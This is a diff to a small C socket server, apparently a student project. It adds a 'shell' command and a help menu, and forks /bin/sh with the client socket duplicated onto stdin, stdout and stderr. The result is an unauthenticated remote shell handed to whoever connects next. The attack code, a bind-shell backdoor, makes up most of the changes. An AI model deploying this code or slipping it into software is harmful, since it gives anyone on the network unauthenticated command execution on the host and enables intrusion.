@@ -12,26 +12,16 @@
 
 #define DEBUG printf
 #define MAX_CLIENTS 3
-#define PORT 6969
+#define PORT 6970
+
+#define HELP							\
+"?		show help\n"					\
+"shell	spawn remote shell on 4242\n"
 
 char *clean_join(char *s1, char *s2) {
 	char *tmp = ft_strjoin(s1, s2);
 	free(s1);
 	return tmp;
-}
-
-char *get_file(int fd) {
-	char *l = NULL;
-	char *res = ft_strdup("");
-
-	do {
-		free(l);
-		l = get_next_line(fd);
-		if (l)
-			res = clean_join(res, l);
-	} while (l);
-
-	return res;
 }
 
 int init_socket(struct sockaddr_in *addr) {
@@ -78,9 +68,10 @@ bool new_connection(
 }
 
 void disconnect_client(int fd, int epollfd, struct epoll_event *ev) {
-	printf("Client disconnected\n");
+	printf("Client disconnected !\n");
 	if (epoll_ctl(epollfd, EPOLL_CTL_DEL, fd, ev) < 0)
 		DEBUG("epoll_ctl does not work");
+	close(fd);
 }
 
 char *readline(int fd) {
@@ -105,6 +96,23 @@ char *readline(int fd) {
 	}
 
 	return cmd;
+}
+
+void putstr(int fd, char *s) {
+	send(fd, s, ft_strlen(s), 0);
+}
+
+bool sh(int fd) {
+	int pid = fork();
+
+	if (!pid) {
+		dup2(fd, 0);
+		dup2(fd, 1);
+		dup2(fd, 2);
+		execl("/bin/sh", "sh", (char *) NULL);
+	}
+
+	return true;
 }
 
 int main() {
@@ -142,21 +150,24 @@ int main() {
 			int fd = events[n].data.fd;
 			if (fd == sock) {
 				new_connection(sock, epollfd, &addr, &ev);
-			} else {
+
 				if (shell) {
+					shell = false;
+					sh(fd);
+				}
+			} else {
+				char *line = readline(fd);
+
+				if (!line) {
+					disconnect_client(fd, epollfd, &ev);
 					continue;
 				}
-				shell = true;
-				int pid = fork();
 
-				if (pid < 0) {
-					DEBUG("fork does not work");
-					return 0;
-				} else if (!pid) {
-					dup2(fd, 0);
-					dup2(fd, 1);
-					dup2(fd, 2);
-					execl("/bin/sh", "sh", (char *) NULL);
+				if (!ft_strcmp(line, "shell\n")) {
+					shell = true;
+					disconnect_client(fd, epollfd, &ev);
+				} else if (!ft_strcmp(line, "?\n")) {
+					putstr(fd, HELP);
 				}
 			}
 		}
